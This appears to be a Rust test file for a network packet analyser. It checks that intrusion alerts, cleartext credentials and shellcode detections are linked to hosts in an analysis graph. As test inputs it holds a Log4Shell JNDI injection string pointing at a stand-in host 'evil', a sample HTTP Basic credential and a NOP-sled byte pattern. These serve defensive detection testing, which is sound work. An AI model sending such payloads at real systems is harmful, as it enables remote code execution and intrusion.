#[path = "support/packets.rs"]
mod packets;

use packrat_tui::{
    engine::AnalysisCore,
    model::graph_types::{GraphNodeData, GraphNodeKind},
    net::parser::parse_ethernet,
};

#[test]
fn alerts_correlate_to_actual_hosts_before_any_ui_tick() {
    let mut core = AnalysisCore::default();
    let packet = packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}");
    core.analyze(&packet);
    let graph = &core.operator_graph;
    let alert = graph
        .all_nodes()
        .find(|node| matches!(&node.data, GraphNodeData::Alert(_)))
        .unwrap();
    assert_eq!(graph.in_edges(alert.id).len(), 2);
    assert_eq!(alert.first_seen, 1.0);
    if let GraphNodeData::Alert(data) = &alert.data {
        assert!(data.detail.contains("10.0.0.1"));
        assert!(data.detail.contains("10.0.0.2"));
    }
    let counts = (graph.node_count(), graph.edge_count());
    core.rebuild_retained_graph([&packet]);
    assert_eq!(
        (
            core.operator_graph.node_count(),
            core.operator_graph.edge_count()
        ),
        counts
    );
    for _ in 0..60 {
        core.maintenance();
    }
    assert_eq!(
        (
            core.operator_graph.node_count(),
            core.operator_graph.edge_count()
        ),
        counts
    );
}

#[test]
fn cleartext_credentials_have_host_links_and_packet_evidence() {
    let packet = packets::tcp(
        1,
        100,
        0x18,
        b"GET / HTTP/1.1\r\nAuthorization: Basic YWxpY2U6c2VjcmV0\r\n\r\n",
    );
    let mut raw = packet.bytes.to_vec();
    raw[34..36].copy_from_slice(&20480u16.to_be_bytes());
    let packet = parse_ethernet(&raw, 1, 1.0);
    let mut core = AnalysisCore::default();
    core.analyze(&packet);
    assert_eq!(core.credentials.len(), 1);
    let graph = &core.operator_graph;
    let nodes = graph.nodes_by_kind(&GraphNodeKind::Credential);
    assert_eq!(nodes.len(), 1);
    assert!(!graph.get_node(nodes[0]).unwrap().evidence.is_empty());
    assert_eq!(graph.in_edges(nodes[0]).len(), 1);
    assert_eq!(graph.out_edges(nodes[0]).len(), 1);
}

#[test]
fn detection_correlation_continues_after_alert_retention_rollover() {
    let mut core = AnalysisCore::default();
    for no in 1..=1002 {
        core.analyze(&packets::tcp(no, 100, 0x18, &[0x90; 16]));
    }
    assert_eq!(core.security.ids_alerts.len(), 1000);
    let sled_alerts = core.operator_graph.all_nodes().filter(|node| {
        matches!(&node.data, GraphNodeData::Alert(alert) if alert.signature == "Shellcode NOP sled")
    }).count();
    assert_eq!(sled_alerts, 1002);
    assert!(
        core.operator_graph
            .all_nodes()
            .any(|node| matches!(&node.data, GraphNodeData::Alert(alert) if alert.pkt_no == 1002))
    );
}
